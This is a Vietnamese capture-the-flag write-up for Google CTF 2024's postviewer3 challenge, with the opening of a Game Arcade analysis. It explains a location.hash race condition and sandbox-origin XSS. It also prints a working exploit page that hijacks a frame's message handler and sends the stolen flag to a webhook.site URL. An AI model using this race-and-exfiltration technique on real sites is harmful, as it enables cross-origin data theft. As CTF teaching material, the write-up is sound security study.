<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">container</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;#container&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">container</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">body</span><span class="p">],</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">type</span><span class="p">}));</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">sandbox</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">iframe</span><span class="p">.</span><span class="nx">sandbox</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">sandbox</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">container</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">setTimeout</span><span class="p">(()=&gt;{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">container</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">&#39;spinner&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">setTimeout</span><span class="p">(()=&gt;{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">container</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">&#39;spinner&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>Tới đây thì mình nghĩ, sẽ ra sao nếu mình dùng <code>const win = window.open(&quot;https://postviewer3-web.2024.ctfcompetition.com/#0&quot;)</code> để mở trang challenge với hash là <code>#0</code> để trigger mở file flag, sau đó <code>win.frames[0].postMessage(...)</code> để gửi postMessage đến sbx origin bên trong? Chắc chắn là fail, vì đoạn check <code>e.source !== parent</code>. Một lúc sau mình nảy ra thêm một ý khác, sẽ ra sao nếu ta có thể XSS được sbx origin, từ đó thực hiện <code>win = window.open(&quot;https://postviewer3-web.2024.ctfcompetition.com/#0&quot;)</code> và <code>win.frames[0].eval(...)</code> để XSS luôn iframe bên trong của challenge? Nếu thế thì ta cần thỏa mãn 1 điều kiện:</p>
<ul>
<li>Sbx origin mà ta XSS phải có cùng origin với sbx origin mà challenge mở (nghĩa là bọn nó phải cùng hash với nhau)</li>
</ul>
<p>Tới đây mình nghĩ rằng có lẽ ta sẽ cần leak được origin của flag, nhưng không có manh mối gì cả&hellip; vậy thì control origin của flag luôn thì sao?</p>


<h3 class="relative group">Race condition 
    <div id="race-condition" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#race-condition" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Nhìn vào <code>safeFrameRender</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">calculateHash</span><span class="p">(</span><span class="nx">body</span><span class="p">,</span> <span class="nx">product</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">,</span> <span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
</span></span></code></pre></div><p>Ở stage này thì body sẽ là <code>evaluatorHtml</code>, product là <code>postviewer</code>, window.origin là <code>https://postviewer3-web.2024.ctfcompetition.com</code>, chỉ có <code>location.href</code> là không biết được do phần hash của chứa file id của flag thì ta không biết, vì nếu trigger bằng hash <code>#0</code> thì tí nữa hash cũng sẽ bị replace thành file id của flag</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/99c29bb3-2372-4e3a-9fd2-f66f6966c49b" alt="image" />
    
  </figure>
</p>
<p>Vậy thì sẽ ra sao nếu <code>location.hash</code> bị đổi sau khi <code>location.hash</code> bị reassign và trước khi được đưa vào hàm <code>calculateHash</code>? Lúc này thì ta sẽ control được cả 4 factor tạo nên sha256 hash nên ta sẽ biết được sbx origin được sử dụng để send flag đến. Vậy biết được origin rồi thì sao nữa nhỉ&hellip; tại đây ta có thể dựa trên bug XSS ở sbx origin ban đầu, lợi dụng nó để XSS sbx origin của iframe trong challenge</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/0d26161e-a3da-445f-a1e3-d70062ba7d1b" alt="image" />
    
  </figure>
</p>
<p>Vấn đề là làm sao để sbx origin mà ta XSS có cùng origin (cùng hash) với origin bên trong server được? Vì nếu muốn XSS được sbx origin thì body của ta sẽ khác với body mà sbx origin của challenge dùng chứ đúng không? Đến đây thì mình nghĩ maybe là có hash collision chăng? Nhưng mà sha256 thì collison thế quái nào được nhỉ&hellip; Sau một tí thời gian thì mình nhận ra là nó đơn giản hơn thế nhiều, ta chỉ cần dùng lại body trong <code>evaluatorHtml</code> là được, lúc này body sẽ trùng với body mà challenge sử dụng, và trên hết là lúc này ta sẽ pass được phần check <code>e.source !== parent</code> vì theo sơ đồ bên trên <code>exploit.html</code> chắc chắn sẽ là parent của sbx origin này.</p>
<p>Còn một điều nữa đó là <code>TRUSTED_ORIGIN</code> vẫn chưa giống với <code>TRUSTED_ORIGIN</code> của challenge, ở challenge thì argument thứ 3 sẽ là <code>https://postviewer3-web.2024.ctfcompetition.com</code> (window.origin), còn đối với sbx origin mà ta chuẩn bị XSS, ta sẽ phải để <code>TRUSTED_ORIGIN</code> là origin mà ta dùng để host <code>exploit.html</code> (ngrok maybe)</p>
<p>Cách giải quyết cũng không khó lắm, vì control được hash của challenge thông qua race condition, ta có thể append <code>TRUSTED_ORIGIN</code> của ta (ngrok) vào hash đó, sau đó trong phần body mà ta chuẩn bị postMessage qua cho origin sbx ta sẽ thêm <code>postviewerhttps://postviewer3-web.2024.ctfcompetition.comhttps://postviewer3-web.2024.ctfcompetition.com/#</code> vào để nó khớp với server, nhằm generate ra 2 hash giống nhau</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6e004d74-dfda-4939-9f82-20bb20ff5e62" alt="image" />
    
  </figure>
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">prepend_chunk</span> <span class="o">=</span> <span class="nx">evaluatorHtml</span> <span class="o">+</span> <span class="s2">&#34;postviewer&#34;</span> <span class="o">+</span> <span class="s2">&#34;https://postviewer3-web.2024.ctfcompetition.com&#34;</span> <span class="o">+</span> <span class="s2">&#34;https://postviewer3-web.2024.ctfcompetition.com/#&#34;</span> 
</span></span></code></pre></div>

<h3 class="relative group">Double race condition 
    <div id="double-race-condition" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#double-race-condition" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Tiếp đến thì khi race condition trigger hash change vào đúng race window, ta sẽ có window bị XSS và iframe bên trong của challenge có origin giống nhau, do đó từ window bị XSS ta có thể thực hiện <code>win.frames[0].eval(...)</code>. Vấn đề là ở iframe này thì origin của nó khác với blob iframe bên trong, bởi blob URL sẽ có origin là null, và origin là null thì sẽ luôn luôn fail SOP (đúng vậy, 2 null origin cũng sẽ được xem là khác origin). Ở đây ta sẽ thực hiện set <code>win.frames[0].onmessage = ...</code> để setup một message handler mới trước khi bên challenge thực hiện postMessage với nội dung flag qua nhằm gửi flag về webhook (vì body gửi qua là một ArrayBuffer nên ta cũng sẽ cần convert nó qua string trước khi fetch flag về nữa).</p>


<h3 class="relative group">StrictOriginIsolation 
    <div id="strictoriginisolation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#strictoriginisolation" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Ta thấy chrome của bot enable một feature flag</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/08d4bfff-0979-41eb-a0f0-098c63f7e22d" alt="image" />
    
  </figure>
</p>
<blockquote>
<p>Strict Origin Isolation would improve security by ensuring different origins do not share a process with each other, but it poses a risk of increased resource usage</p>
</blockquote>
<blockquote>
<p>When enabled, Chrome opens up a dedicated process for each website you access and creates a strict wall between them that keeps them separate. This creates a dedicated sandbox for each website where neither they can access information of other websites nor their information could be accessed by other websites.</p>
</blockquote>
<p>Ngắn gọn là mỗi website ta access sẽ được render trong một process riêng biệt, đây là một mitigation đối với meltdown attack, mitigation sẽ đi với các drawback nhất định và ở trường hợp này là CPU usage và thời gian xử lý, các tác vụ sẽ cần thời gian lâu hơn để thực và do đó, so với khi không enable feature này thì khi thực hiện race ta sẽ cần nới lỏng thời gian sleep đi, và nếu ta để ý thì</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5a75e7d7-a53b-4362-8f5c-eb402ed30cd5" alt="image" />
    
  </figure>
</p>
<p>Có một lệnh <code>sleep</code> tưởng như vô nghĩa được chèn vào giữa đoạn xử lý hash, thật ra thì một lệnh này là đã đủ và có lẽ là không cần ta phải thêm một lệnh sleep nào khác trong exploit nữa, có lẽ là intended của tác giả để làm race dễ dính hơn.</p>


<h3 class="relative group">Exploit 
    <div id="exploit" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#exploit" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">iframe</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;a.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">the_hash</span> <span class="o">=</span> <span class="sb">`postviewerhttps://75a7-203-167-11-246.ngrok-free.app`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// const the_hash = `file-ff582564efb8cb8229f1db607c35ae35c4b59e27`;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">        function sleep(ms) {
</span></span></span><span class="line"><span class="cl"><span class="sb">            return new Promise(resolve =&gt; setTimeout(resolve, ms));
</span></span></span><span class="line"><span class="cl"><span class="sb">        }
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">        async function race(win) {
</span></span></span><span class="line"><span class="cl"><span class="sb">            while (true) {
</span></span></span><span class="line"><span class="cl"><span class="sb">                try {
</span></span></span><span class="line"><span class="cl"><span class="sb">                    await sleep(800);
</span></span></span><span class="line"><span class="cl"><span class="sb">                    win.location.replace(&#34;https://postviewer3-web.2024.ctfcompetition.com/#0&#34;)
</span></span></span><span class="line"><span class="cl"><span class="sb">                    win.location.replace(&#34;https://postviewer3-web.2024.ctfcompetition.com/#</span><span class="si">${</span><span class="nx">the_hash</span><span class="si">}</span><span class="sb">&#34;)
</span></span></span><span class="line"><span class="cl"><span class="sb">                    await sleep(0);
</span></span></span><span class="line"><span class="cl"><span class="sb">                    // console.log(win.frames[0].location.href)
</span></span></span><span class="line"><span class="cl"><span class="sb">                    win.frames[0].window.onmessage = (e) =&gt; {
</span></span></span><span class="line"><span class="cl"><span class="sb">                        // location.href = &#34;https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c=&#34;+123
</span></span></span><span class="line"><span class="cl"><span class="sb">                        var enc = new TextDecoder(&#34;utf-8&#34;);
</span></span></span><span class="line"><span class="cl"><span class="sb">                        location.href = &#34;https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c=&#34;+enc.decode(e.data.body)
</span></span></span><span class="line"><span class="cl"><span class="sb">                    }
</span></span></span><span class="line"><span class="cl"><span class="sb">                } catch (e) {}
</span></span></span><span class="line"><span class="cl"><span class="sb">            }
</span></span></span><span class="line"><span class="cl"><span class="sb">        }
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">        for (let i = 0; i &lt; 100; i++) {
</span></span></span><span class="line"><span class="cl"><span class="sb">            race(open(&#34;https://postviewer3-web.2024.ctfcompetition.com/&#34;));
</span></span></span><span class="line"><span class="cl"><span class="sb">        }
</span></span></span><span class="line"><span class="cl"><span class="sb">        
</span></span></span><span class="line"><span class="cl"><span class="sb">        `</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">ifrm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;iframe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">prepend_chunk</span> <span class="o">=</span> <span class="nx">evaluatorHtml</span> <span class="o">+</span> <span class="s2">&#34;postviewer&#34;</span> <span class="o">+</span> <span class="s2">&#34;https://postviewer3-web.2024.ctfcompetition.com&#34;</span> <span class="o">+</span> <span class="s2">&#34;https://postviewer3-web.2024.ctfcompetition.com/#&#34;</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">ifrm</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;https://sbx-1npy2a9m4fd8g0r5jeg1qwkarykrt1gnvdxxhh5ia0nxk8nvrb.postviewer3-web.2024.ctfcompetition.com/postviewer/shim.html?o=https://75a7-203-167-11-246.ngrok-free.app&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ifrm</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ifrm</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;body&#34;</span><span class="o">:</span> <span class="nx">prepend_chunk</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;mimeType&#34;</span><span class="o">:</span> <span class="s2">&#34;text/html&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;salt&#34;</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">},</span> <span class="s2">&#34;*&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">ifrm</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;eval&#34;</span><span class="o">:</span><span class="nx">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;body&#34;</span><span class="o">:</span> <span class="s2">&#34;aaa&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;mimeType&#34;</span><span class="o">:</span> <span class="s2">&#34;text/html&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;salt&#34;</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">},</span> <span class="s2">&#34;*&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span> <span class="mi">1000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- &lt;script&gt;
</span></span></span><span class="line"><span class="cl"><span class="c">        const win = window.open(&#34;https://postviewer3-web.2024.ctfcompetition.com/#1&#34;, &#34;_blank&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c">
</span></span></span><span class="line"><span class="cl"><span class="c">    &lt;/script&gt; --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>a.js:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">evaluatorHtml</span> <span class="o">=</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">&lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">  &lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;title&gt;Evaluator&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;script&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      onmessage = e =&gt; {
</span></span></span><span class="line"><span class="cl"><span class="sb">        if(e.source !== parent) {
</span></span></span><span class="line"><span class="cl"><span class="sb">          throw /not parent/;
</span></span></span><span class="line"><span class="cl"><span class="sb">        };
</span></span></span><span class="line"><span class="cl"><span class="sb">        if(e.data.eval){
</span></span></span><span class="line"><span class="cl"><span class="sb">          eval(e.data.eval);
</span></span></span><span class="line"><span class="cl"><span class="sb">        }
</span></span></span><span class="line"><span class="cl"><span class="sb">      }
</span></span></span><span class="line"><span class="cl"><span class="sb">      onload = () =&gt; {
</span></span></span><span class="line"><span class="cl"><span class="sb">        parent.postMessage(&#39;loader ready&#39;,&#39;*&#39;);
</span></span></span><span class="line"><span class="cl"><span class="sb">      }
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;style&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      body{
</span></span></span><span class="line"><span class="cl"><span class="sb">        padding: 0px;
</span></span></span><span class="line"><span class="cl"><span class="sb">        margin: 0px;
</span></span></span><span class="line"><span class="cl"><span class="sb">      }
</span></span></span><span class="line"><span class="cl"><span class="sb">      iframe{
</span></span></span><span class="line"><span class="cl"><span class="sb">        width: 100vw;
</span></span></span><span class="line"><span class="cl"><span class="sb">        height: 100vh;
</span></span></span><span class="line"><span class="cl"><span class="sb">        border: 0;
</span></span></span><span class="line"><span class="cl"><span class="sb">      }
</span></span></span><span class="line"><span class="cl"><span class="sb">      .spinner {
</span></span></span><span class="line"><span class="cl"><span class="sb">        background: url(https://storage.googleapis.com/gctf-postviewer/spinner.svg) center no-repeat;
</span></span></span><span class="line"><span class="cl"><span class="sb">      }
</span></span></span><span class="line"><span class="cl"><span class="sb">      .spinner iframe{
</span></span></span><span class="line"><span class="cl"><span class="sb">        opacity: 0.2
</span></span></span><span class="line"><span class="cl"><span class="sb">      }
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;/style&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">  &lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">  &lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;div id=&#34;container&#34; class=&#34;spinner&#34;&gt;&lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">  &lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">&lt;/html&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">`</span><span class="p">;</span>
</span></span></code></pre></div><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e0b3c7f1-e26b-4945-bff9-df28a1ff4cb5" alt="image" />
    
  </figure>
</p>


<h2 class="relative group">GAME ARCADE 
    <div id="game-arcade" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#game-arcade" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Bài này gần giống bài postviewerv3 về cơ chế sandbox, một trong những điểm khác biệt đáng lưu ý đó là browser mà bài này sử dụng là firefox.</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/17687953-ecef-4445-8141-a20924f9944d" alt="image" />
    
  </figure>
</p>
<p>Vậy thì có thể đây là một behavior này đó đặc biệt của firefox chăng? Đầu tiên thì cứ ngồi analyze xem bài này có gì. Cơ chế tạo hash cho sbx origin của bài khá giống với postviewerv3, khác là các factor được dùng để tạo hash giờ đây được ngăn cách bằng delimiter là <code>$@#|</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8c52882f-28de-4aa1-b414-9f072c5c6e65" alt="image" />
    
  </figure>
</p>
<p>Mỗi khi ta chọn một game, một sbx origin cũng sẽ được tạo ra để render và sandbox HTML của game đó lại, đáng lưu ý thì có một game là password guessing, cũng là game duy nhất mà con bot có tương tác. Cụ thể thì con bot sẽ nhả flag vào ô change password của game này, có vẻ ta sẽ phải tìm cách để leak flag trong game này. Hẳn bạn còn nhớ cơ chế giao tiếp giữa sbx origin và origin của challenge trong bài trước, đó chính là thông qua postMessage, ở bài này cũng vậy tuy nhiên thì ở bài này postMessage diễn ra thông qua một MessageChannel: <a href="https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel" target="_blank">https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel</a></p>


<h3 class="relative group">MessageChannel 
    <div id="messagechannel" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#messagechannel" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Khi làm việc với MessageChannel thì ta sẽ có 2 <code>port</code>, ta sẽ nhận message bằng một port (tạm gọi port A) và gửi port còn lại (tạm gọi port B) cho đầu nhận, đầu nhận nếu cần reply lại message vừa rồi thì sẽ thực hiện postMessage thông qua port B, port A sẽ là nơi được đầu gửi setup message handler nhằm nhận message. Vạy thì tại sao bài này lại dùng MessageChannel? Cùng lấy 1 ví dụ</p>
<p>a.html:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">messageChannel</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MessageChannel</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">messageChannel</span><span class="p">.</span><span class="nx">port1</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;recv from channel:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;recv from window.onmessage:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;b.html&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">win</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="p">[</span><span class="nx">messageChannel</span><span class="p">.</span><span class="nx">port2</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>b.html:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;message received, sending callback...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&#34;aaa&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
